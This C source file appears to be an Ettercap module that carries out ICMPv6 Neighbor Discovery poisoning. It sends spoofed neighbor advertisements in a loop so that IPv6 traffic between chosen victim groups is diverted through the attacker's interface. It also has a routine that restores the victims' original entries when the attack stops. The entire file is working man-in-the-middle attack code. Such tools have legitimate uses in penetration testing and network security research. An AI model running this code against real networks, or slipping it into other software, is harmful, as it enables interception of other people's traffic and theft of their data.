/*
 *    ICMPv6 Neighbor Advertisement poisoning ec module.
 *    The basic idea is the same as for ARP poisoning
 *    but ARP cannot be used with IPv6. Lurk [1] for details.
 *
 *    [1] - http://packetlife.net/blog/2009/feb/2/ipv6-neighbor-spoofing/
 *
 *    the braindamaged entities collective
 */

#include <ec.h>
#include <ec_mitm.h>
#include <ec_threads.h>
#include <ec_send.h>
#include <ec_hook.h>

/* globals */
struct hosts_group nadv_group_one;
struct hosts_group nadv_group_two;

static LIST_HEAD(,ip_list) ping_list_one;
static LIST_HEAD(,ip_list) ping_list_two;

u_int8 flags;
#define ND_ONEWAY    ((u_int8)(1<<0))
#define ND_ROUTER    ((u_int8)(1<<2))

/* protos */
void nadv_poison_init(void);
static int nadv_poison_start(char *args);
static void nadv_poison_stop(void);
EC_THREAD_FUNC(nadv_poisoner);
static int create_list(void);
static int create_list_silent(void);
static void catch_response(struct packet_object *po);
static void nadv_antidote(void);
static void record_mac(struct packet_object *po);

/* c0d3 */

void __init nadv_poison_init(void)
{
   struct mitm_method mm;

   mm.name = "ndp";
   mm.start = &nadv_poison_start;
   mm.stop = &nadv_poison_stop;

   mitm_add(&mm);
}

static int nadv_poison_start(char *args)
{
   struct hosts_list *h, *tmp;
   int ret;
   char *p;

   DEBUG_MSG("nadv_poison_start");

   flags = ND_ROUTER;

   if(strcmp(args, "")) {
      for(p = strsep(&args, ","); p != NULL; p = strsep(&args, ",")) {
         if(!strcasecmp(p, "remote"))
            GBL_OPTIONS->remote = 1;
         else if(!strcasecmp(p, "oneway"))
            flags |= ND_ONEWAY;
         else
            SEMIFATAL_ERROR("NDP poisoning: incorrect arguments.\n");
      }
   } else {
      SEMIFATAL_ERROR("NDP poisoning: missing arguments.\n");
   }

   /* we need the host list */
   if (LIST_EMPTY(&GBL_HOSTLIST)) 
      SEMIFATAL_ERROR("NDP poisoning needs a non-emtpy hosts list.\n");

   /* clean the lists */
   LIST_FOREACH_SAFE(h, &nadv_group_one, next, tmp) {
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }
   LIST_FOREACH_SAFE(h, &nadv_group_two, next, tmp) {
      LIST_REMOVE(h, next);
      SAFE_FREE(h);
   }

   if(GBL_OPTIONS->silent) {
      ret = create_list_silent();
   } else 
      ret = create_list();

   if (ret != ESUCCESS) {
      SEMIFATAL_ERROR("NDP poisoning failed to start");
   }
   /* hook necessary? - Maybe if solicitations are seen */

   ec_thread_new("nadv_poisoner", "NDP spoofing thread", &nadv_poisoner, NULL);

   return ESUCCESS;
}

static void nadv_poison_stop(void)
{
   pthread_t pid;

   DEBUG_MSG("nadv_poison_stop");
   
   pid = ec_thread_getpid("nadv_poisoner");
   if(!pthread_equal(pid, EC_PTHREAD_NULL))
      ec_thread_destroy(pid);
   else {
      DEBUG_MSG("no poisoner thread found");
      return;
   }

   USER_MSG("NDP poisoner deactivated.\n");

   USER_MSG("Depoisoning the victims.\n");
   nadv_antidote();

   ui_msg_flush(2);

   return;
}

EC_THREAD_FUNC(nadv_poisoner)
{
   struct hosts_list *t1, *t2;

#if !defined(OS_WINDOWS)
   struct timespec tm;
   tm.tv_nsec = GBL_CONF->ndp_poison_send_delay * 1000;
   tm.tv_sec = 0;
#endif

   ec_thread_init();
   DEBUG_MSG("nadv_poisoner");

   /* it's a loop */
   LOOP {
      
      CANCELLATION_POINT();

      /* Here we go! */
      LIST_FOREACH(t1, &nadv_group_one, next) {
         LIST_FOREACH(t2, &nadv_group_two, next) {

            if(!ip_addr_cmp(&t1->ip, &t2->ip))
               continue;

            send_icmp6_nadv(&t1->ip, &t2->ip, &t1->ip, GBL_IFACE->mac, flags);
            if(!(flags & ND_ONEWAY))
               send_icmp6_nadv(&t2->ip, &t1->ip, &t2->ip, GBL_IFACE->mac, flags & ND_ROUTER);

#if !defined(OS_WINDOWS)
            nanosleep(&tm, NULL);
#else
            usleep(GBL_CONF->ndp_poison_send_delay);
#endif
         }
      }


      sleep(1);
   }

   return NULL;
}

static int create_list(void)
{
   struct ip_list *i;
   struct hosts_list *h, *g;
   char tmp[MAX_ASCII_ADDR_LEN];
   char tmp2[MAX_ASCII_ADDR_LEN];

   DEBUG_MSG("ndp poisoning: create_list");

   USER_MSG("\nNDP poisoning victims:\n\n");


   /* the first group */
   LIST_FOREACH(i, &GBL_TARGET1->ip6, next) {
      /* walk through TARGET1 selected IPv6 addresses */
      LIST_FOREACH(h, &GBL_HOSTLIST, next) {
         /* search matching entry in host list */
         if (!ip_addr_cmp(&i->ip, &h->ip)) {
            USER_MSG(" GROUP 1 : %s %s\n",
                  ip_addr_ntoa(&h->ip, tmp),
                  mac_addr_ntoa(h->mac, tmp2));

            /* create element and insert into list */
            SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

            memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
            memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);

            LIST_INSERT_HEAD(&nadv_group_one, g, next);
         }
      }
   }

   /* the target is NULL - convert to ANY */
   if (LIST_FIRST(&GBL_TARGET1->ip6) == NULL) {

      USER_MSG(" GROUP 1 : ANY (all IPv6 hosts in the list)\n");

      /* add all hosts in HOSTLIST */
      LIST_FOREACH(h, &GBL_HOSTLIST, next) {

         /* only IPv6 addresses are applicable */
         if (ntohs(h->ip.addr_type) != AF_INET6) 
            continue;

         /* create the element and insert into list */
         SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
         memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);

         LIST_INSERT_HEAD(&nadv_group_one, g, next);
      }
   }

   USER_MSG("\n");

   /* the second group */

   /* if the target was specified */
   LIST_FOREACH(i, &GBL_TARGET2->ip6, next) {
   /* walk through TARGET1 selected IPv6 addresses */
      LIST_FOREACH(h, &GBL_HOSTLIST, next) {
         /* search matching entry in host list */
         if (!ip_addr_cmp(&i->ip, &h->ip)) {
            USER_MSG(" GROUP 2 : %s %s\n",
                  ip_addr_ntoa(&h->ip, tmp),
                  mac_addr_ntoa(h->mac, tmp2));

            /* create the element and insert in the list */
            SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

            memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
            memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);

            LIST_INSERT_HEAD(&nadv_group_two, g, next);
         }
      }
   }

   /* the target is NULL - convert to ANY */
   if (LIST_FIRST(&GBL_TARGET2->ip6) == NULL) {

      USER_MSG(" GROUP 2 : ANY (all IPv6 hosts in the list)\n");

      /* add them */
      LIST_FOREACH(h, &GBL_HOSTLIST, next) {

         /* only IPv6 addresses are applicable */
         if (ntohs(h->ip.addr_type) != AF_INET6) 
            continue;

         /* create the element and insert in the list */
         SAFE_CALLOC(g, 1, sizeof(struct hosts_list));

         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
         memcpy(&g->mac, &h->mac, MEDIA_ADDR_LEN);

         LIST_INSERT_HEAD(&nadv_group_two, g, next);
      }
   }

   return ESUCCESS;
}

static int create_list_silent(void)
{
   struct hosts_list *h;
   struct ip_list *i;
   char tmp[MAX_ASCII_ADDR_LEN];
   char tmp2[MAX_ASCII_ADDR_LEN];

   DEBUG_MSG("create_list_silent");

   LIST_FOREACH(i, &GBL_TARGET1->ip6, next) {
      if(ip_addr_is_local(&i->ip, NULL) == ESUCCESS) {
         if (!memcmp(GBL_TARGET1->mac, "\x00\x00\x00\x00\x00\x00", MEDIA_ADDR_LEN)) {
            USER_MSG("\nERROR: MAC address must be specified in silent mode.\n");
            return -EFATAL;
         }
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &i->ip, sizeof(struct ip_addr));
         memcpy(&h->mac, &GBL_TARGET1->mac, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&nadv_group_one, h, next);

         USER_MSG(" TARGET 1 : %-40s %17s\n", 
               ip_addr_ntoa(&i->ip, tmp),
               mac_addr_ntoa(GBL_TARGET1->mac, tmp2));
      }
      else {
         USER_MSG("%s is not local. NDP poisoning impossible\n", 
               ip_addr_ntoa(&i->ip, tmp));
         return -EFATAL;
      }
   }

   LIST_FOREACH(i, &GBL_TARGET2->ip6, next) {
      if(ip_addr_is_local(&i->ip, NULL) == ESUCCESS) {
         if (!memcmp(GBL_TARGET2->mac, "\x00\x00\x00\x00\x00\x00", MEDIA_ADDR_LEN)) {
            USER_MSG("\nERROR: MAC address must be specified in silent mode.\n");
            return -EFATAL;
         }
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &i->ip, sizeof(struct ip_addr));
         memcpy(&h->mac, &GBL_TARGET2->mac, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&nadv_group_two, h, next);

         USER_MSG(" TARGET 2 : %-40s %17s\n", 
               ip_addr_ntoa(&i->ip, tmp),
               mac_addr_ntoa(GBL_TARGET2->mac, tmp2));
      }
      else {
         USER_MSG("%s is not local. NDP poisoning impossible\n", 
               ip_addr_ntoa(&i->ip, tmp));
      }
   }

   return ESUCCESS;
}

static void catch_response(struct packet_object *po)
{
   struct hosts_list *h;
   struct ip_list *i;

   /* if it is not response to our ping */
   if(ip_addr_is_ours(&po->L3.dst) != EFOUND)
      return; 

   /* 
    * search if the node address is in one of the ping lists
    * if so add the address to the poison list
    */
   LIST_FOREACH(i, &ping_list_one, next) {
      /* the source is in the ping hosts list */
      if(!ip_addr_cmp(&po->L3.src, &i->ip)) {
         LIST_REMOVE(i, next);
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &po->L3.src, sizeof(struct ip_addr));
         memcpy(&h->mac, &po->L2.src, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&nadv_group_one, h, next);
         break;
      }
   }

   LIST_FOREACH(i, &ping_list_two, next) {
      if(!ip_addr_cmp(&po->L3.src, &i->ip)) {
         LIST_REMOVE(i, next);
         SAFE_CALLOC(h, 1, sizeof(struct hosts_list));
         memcpy(&h->ip, &po->L3.src, sizeof(struct ip_addr));
         memcpy(&h->mac, &po->L2.src, MEDIA_ADDR_LEN);
         LIST_INSERT_HEAD(&nadv_group_two, h, next);
         break;
      }
   }

   return;
}

static void nadv_antidote(void)
{
   struct hosts_list *h1, *h2;
   int i;

   DEBUG_MSG("nadv_antidote");

   /* do it twice */
   for(i = 0; i < 2; i++) {
      LIST_FOREACH(h1, &nadv_group_one, next) {
         LIST_FOREACH(h2, &nadv_group_two, next) {
            if(!ip_addr_cmp(&h1->ip, &h2->ip))
               continue;

            send_icmp6_nadv(&h1->ip, &h2->ip, &h1->ip, h1->mac, flags);
            if(!(flags & ND_ONEWAY))
               send_icmp6_nadv(&h2->ip, &h1->ip, &h2->ip, h2->mac, flags & ND_ROUTER);

            usleep(GBL_CONF->ndp_poison_send_delay);
         }
      }

      sleep(1);
   }
}

static void record_mac(struct packet_object *po)
{
   struct ip_addr *ip;
   u_char *mac;
   struct hosts_list *h;

   if(ip_addr_is_ours(&po->L3.src)) {
      ip = &po->L3.dst;
      mac = po->L2.dst;
   } else if(ip_addr_is_ours(&po->L3.dst)) {
      ip = &po->L3.src;
      mac = po->L2.src;
   } else {
      return;
   }

   LIST_FOREACH(h, &nadv_group_one, next) {
      if(!ip_addr_cmp(&h->ip, ip)) {
         memcpy(&h->mac, mac, MEDIA_ADDR_LEN);
         return;
      }
   }

   LIST_FOREACH(h, &nadv_group_two, next) {
      if(!ip_addr_cmp(&h->ip, ip)) {
         memcpy(&h->mac, mac, MEDIA_ADDR_LEN);
         return;
      }
   }
}

